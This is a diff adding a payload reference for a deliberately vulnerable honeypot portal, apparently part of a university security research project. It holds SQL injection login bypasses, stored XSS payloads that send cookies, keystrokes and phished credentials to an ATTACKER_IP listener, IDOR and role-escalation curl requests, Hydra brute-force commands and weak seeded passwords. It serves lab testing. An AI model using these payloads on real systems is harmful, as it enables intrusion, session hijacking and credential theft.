@@ -1,0 +1,248 @@
+================================================================================
+ TechCorp Internal Portal — Test Payloads Reference
+ IIT Jammu Security Research Project
+================================================================================
+
+ Use these payloads to validate the intentional vulnerabilities in the
+ honeypot portal. Run the app first:  python app.py  (or via Docker)
+ App URL: http://localhost:5000
+
+
+================================================================================
+ 1. SQL INJECTION — Authentication Bypass  (/login)
+================================================================================
+
+ --- Basic Auth Bypass ---
+
+ In the USERNAME field, enter:
+   ' OR '1'='1
+ In the PASSWORD field, enter anything (e.g. "anything")
+ → This logs you in as the first user in the database (admin).
+
+ Alternatively, in the USERNAME field:
+   ' OR '1'='1' --
+ PASSWORD: (leave blank or type anything)
+ → The -- comments out the rest of the SQL query.
+
+ --- Login as a specific user ---
+
+ USERNAME:  admin' --
+ PASSWORD:  (anything)
+ → Logs in as admin, ignoring password check.
+
+ USERNAME:  jsmith' --
+ PASSWORD:  (anything)
+ → Logs in as jsmith.
+
+ --- UNION-based Injection (Data Extraction) ---
+
+ USERNAME:  ' UNION SELECT 1, username, password, email, role FROM users --
+ PASSWORD:  (anything)
+ → May return data from the users table depending on how the app handles results.
+
+ --- Error-based Injection (Info Gathering) ---
+
+ USERNAME:  ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT) --
+ PASSWORD:  (anything)
+ → May trigger an error that reveals the admin username.
+
+ --- Using curl ---
+
+ curl -X POST http://localhost:5000/login \
+   -d "username=' OR '1'='1&password=anything" \
+   -L -c cookies.txt
+
+ curl -X POST http://localhost:5000/login \
+   -d "username=admin' --&password=x" \
+   -L -c cookies.txt
+
+
+================================================================================
+ 2. STORED XSS — Dashboard Comment Box  (/dashboard)
+================================================================================
+
+ Log in first (use any valid account or SQLi bypass), then go to the dashboard.
+ Enter the following payloads in the "Employee Feedback" text box:
+
+ --- Basic Alert ---
+   <script>alert('XSS')</script>
+ → Should trigger a JavaScript alert popup for ALL users who view the dashboard.
+
+ --- Cookie Stealing ---
+   <script>new Image().src='http://ATTACKER_IP:8080/steal?c='+document.cookie;</script>
+ → Sends the user's session cookie to attacker's listener.
+ → Set up a listener:  python3 -m http.server 8080
+
+ --- Session Hijack (Redirect) ---
+   <script>window.location='http://ATTACKER_IP:8080/?cookie='+document.cookie;</script>
+
+ --- Keylogger Injection ---
+   <script>
+   document.onkeypress=function(e){
+     new Image().src='http://ATTACKER_IP:8080/log?key='+e.key;
+   };
+   </script>
+
+ --- HTML Injection (Fake Login Form) ---
+   <div style="background:#1a1a2e;padding:20px;border-radius:10px;margin-top:20px;">
+     <h3 style="color:#fff;">Session Expired — Please Re-authenticate</h3>
+     <form action="http://ATTACKER_IP:8080/phish" method="POST">
+       <input type="text" name="user" placeholder="Username" style="padding:8px;width:100%;margin:5px 0;">
+       <input type="password" name="pass" placeholder="Password" style="padding:8px;width:100%;margin:5px 0;">
+       <button type="submit" style="padding:8px 20px;background:#667eea;color:#fff;border:none;cursor:pointer;">Login</button>
+     </form>
+   </div>
+
+ --- Image Tag with Event Handler ---
+   <img src=x onerror=alert('XSS')>
+
+
+================================================================================
+ 3. IDOR — View/Edit Other Users' Profiles  (/profile)
+================================================================================
+
+ Log in as any user (e.g., jsmith with password123), then:
+
+ --- View Admin's Profile ---
+ Navigate to:  http://localhost:5000/profile?user_id=1
+ → You can see the admin's username, email, and role.
+
+ --- View All Users' Profiles ---
+ Try user_id values 1 through 4:
+   http://localhost:5000/profile?user_id=1   (admin)
+   http://localhost:5000/profile?user_id=2   (jsmith)
+   http://localhost:5000/profile?user_id=3   (agarcia)
+   http://localhost:5000/profile?user_id=4   (mwilson)
+
+ --- Using curl ---
+ curl -b cookies.txt http://localhost:5000/profile?user_id=1
+
+
+================================================================================
+ 4. PRIVILEGE ESCALATION — Role Change via Profile Edit
+================================================================================
+
+ Log in as any non-admin user (e.g., jsmith / password123).
+
+ --- Method 1: Change your own role via the UI ---
+ 1. Go to: http://localhost:5000/profile?user_id=2
+ 2. In the "Role" dropdown, select "Admin"
+ 3. Click "Save Changes"
+ → Your role is now admin.
+
+ --- Method 2: Change your role via curl ---
+ curl -X POST "http://localhost:5000/profile?user_id=2" \
+   -b cookies.txt \
+   -d "user_id=2&username=jsmith&email=john.smith@techcorp-internal.com&role=admin"
+
+ --- Method 3: Edit ANOTHER user's role (IDOR + Priv Esc combined) ---
+ curl -X POST "http://localhost:5000/profile?user_id=4" \
+   -b cookies.txt \
+   -d "user_id=4&username=mwilson&email=mike.wilson@techcorp-internal.com&role=employee"
+ → Demotes mwilson from manager to employee.
+
+
+================================================================================
+ 5. HIDDEN ADMIN PANEL — Default Credentials  (/admin)
+================================================================================
+
+ --- Access the hidden admin page ---
+ Navigate to:  http://localhost:5000/admin
+ (This page is NOT linked anywhere in the site navigation.)
+
+ --- Login with default credentials ---
+ Username:  admin
+ Password:  admin123
+ → Grants access to the fake "System Settings" admin dashboard.
+
+ --- Using curl ---
+ curl -X POST http://localhost:5000/admin \
+   -d "username=admin&password=admin123" \
+   -L -c admin_cookies.txt
+
+ --- Brute Force with Hydra ---
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+   localhost http-post-form \
+   "/admin:username=^USER^&password=^PASS^:Access denied"
+
+
+================================================================================
+ 6. BRUTE FORCE — No Rate Limiting  (/login)
+================================================================================
+
+ --- Using Hydra ---
+ hydra -L users.txt -P passwords.txt \
+   localhost http-post-form \
+   "/login:username=^USER^&password=^PASS^:Invalid credentials"
+
+ Where users.txt contains:
+   admin
+   jsmith
+   agarcia
+   mwilson
+
+ And passwords.txt contains:
+   admin123
+   password123
+   welcome1
+   letmein
+   password
+   123456
+
+ --- Using curl in a loop ---
+ for pass in admin123 password123 welcome1 letmein; do
+   echo "Trying: admin / $pass"
+   curl -s -X POST http://localhost:5000/login \
+     -d "username=admin&password=$pass" \
+     -o /dev/null -w "%{http_code}\n"
+ done
+
+
+================================================================================
+ 7. DIRECTORY / PATH ENUMERATION
+================================================================================
+
+ --- Discover the hidden admin panel ---
+ Use dirb, gobuster, or ffuf:
+
+ gobuster dir -u http://localhost:5000 -w /usr/share/wordlists/dirb/common.txt
+ dirb http://localhost:5000 /usr/share/wordlists/dirb/common.txt
+ ffuf -u http://localhost:5000/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+
+================================================================================
+ 8. LOG VERIFICATION
+================================================================================
+
+ After running any of the above attacks, check the access log:
+
+ --- Inside Docker container ---
+ docker exec -it <container_id> cat /var/log/honeypot/access.log
+
+ --- Pretty-print the JSON Lines ---
+ docker exec -it <container_id> sh -c \
+   "cat /var/log/honeypot/access.log | python3 -m json.tool --json-lines"
+
+ --- Filter for login attempts ---
+ docker exec -it <container_id> sh -c \
+   "grep '/login' /var/log/honeypot/access.log | python3 -m json.tool --json-lines"
+
+ --- If running locally ---
+ cat /var/log/honeypot/access.log
+ # or on Windows, check the ./logs/access.log fallback
+
+
+================================================================================
+ QUICK REFERENCE — SEEDED ACCOUNTS
+================================================================================
+
+   | Username | Password     | Role     |
+   |----------|-------------|----------|
+   | admin    | admin123    | admin    |
+   | jsmith   | password123 | employee |
+   | agarcia  | welcome1    | employee |
+   | mwilson  | letmein     | manager  |
+
+================================================================================
+ END OF PAYLOADS FILE
+================================================================================
